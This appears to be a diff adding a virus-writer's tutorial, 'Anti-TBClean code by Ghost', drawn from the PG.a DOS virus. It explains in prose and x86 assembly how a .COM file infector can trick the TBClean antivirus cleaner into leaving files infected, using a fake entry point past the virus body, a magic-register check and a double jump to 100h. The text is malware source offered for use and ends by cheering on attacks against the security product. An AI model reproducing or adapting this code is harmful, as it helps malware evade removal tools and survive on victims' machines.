@@ -1,0 +1,101 @@
+Anti-TBClean code by Ghost 
+             
+      
+
+
+Working around the generic cleaning ability of TBClean is easy to do.
+The following code fragments come from the PG.a virus. This code works
+with all versions of TBClean from 6.20 to 7.00 (that's all the versions I
+have :)
+
+The first thing to realize is that TBClean works very generically. It
+assumes that a .COM infector will prepend a small jump construct, saving
+the orginal code, and then append the rest of the virus to the end of the
+victim file. It then expects the virus to clean the .COM file, and jump
+back to 100h, as though the .COM file had just started.
+
+What we need to do to fool TBClean is 2 parts. First we must fool
+TBClean into thinking that the virus starts past where the virus actually
+is. Second, we need to JMP back to 100h TWICE. Once BEFORE we clean up
+the .COM header.
+
+-----------------------------
+Step 1: The Virus Jump Header
+-----------------------------
+
+Check a certain (your choice :) register for a value, and if this
+magic value is there, do a RET. This will be called from below just
+before we restore the .COM header. Next write a C3h to the first byte of
+the heap (1 byte past the last code/data of the virus). Then call this
+address. This will make TBClean think this is the entry point into the
+virus, but it's PAST the virus. TBClean will truncate the file when it
+cleans, but by doing this, that truncate is to the EXACT same size as it
+was when infected. Net result, the virus still lives :)
+
+model tiny
+.code
+
+org 100h
+
+start:
+; Step 1 part 1
+cmp ah, 30h ; the check for the MAGIC number
+je TBCleaning ; yeah right (TBClean thinks so :)
+
+mov ax, offset start_vir ; This is the delta offset
+; (it MUST be set when
+; infecting a file, before
+; the header is written to
+; the file.)
+
+mov bx, ax
+add bx, vir_size
+mov byte ptr[bx], 0C3h ; one byte past the END of the
+;virus :)
+
+; TBCLEAN will clean to the address here (it's at the VERY
+;last byte of the file image) It doen't matter if it is there
+;or not! When TBClean is done cleaning this file, it is STILL
+;infected!!
+
+; Step 1 part 2
+call bx
+
+jmp start_vir ; jump to the virus code
+TBCleaning:
+ret ; return back to the .COM fixing
+; part.
+
+
+start_vir: ; THE VIRUS STARTS HERE
+mov bp, bx ; put the delta offset into BP
+
+--------------------------------------
+Step 2: The .COM file restoration code
+-------------------------------------
+
+The final step is to trick TBClean into believing that the virus has
+ended, and that the .COM file is being started. Remember in step 1 where
+we checked for a MAGIC value in a register, well, we set up the register
+with that magic value here, and the do a CALL back to 100h. TBClean will
+think the virus has ended at this point, and will truncate the file
+(remember TBClean thinks the file should be trucated to the EXACT size that
+it is when infected :) After the code returns, then we fix up the .COM
+header, clear the registers, and JMP back to 100h and let the .COM file go
+on its way.
+
+start_com:
+; Anti-TBClean code
+mov ah, 30h ; Setup the MAGIC value in AH.
+mov bx, 100h
+push bx
+call bx
+
+CopyCOMHeader:
+; standard .COM re-starting code here.
+...
+
+ret ; bx = 100h is still on stack.
+
+
+Have fun. TBClean is such a fun product to mess with :)
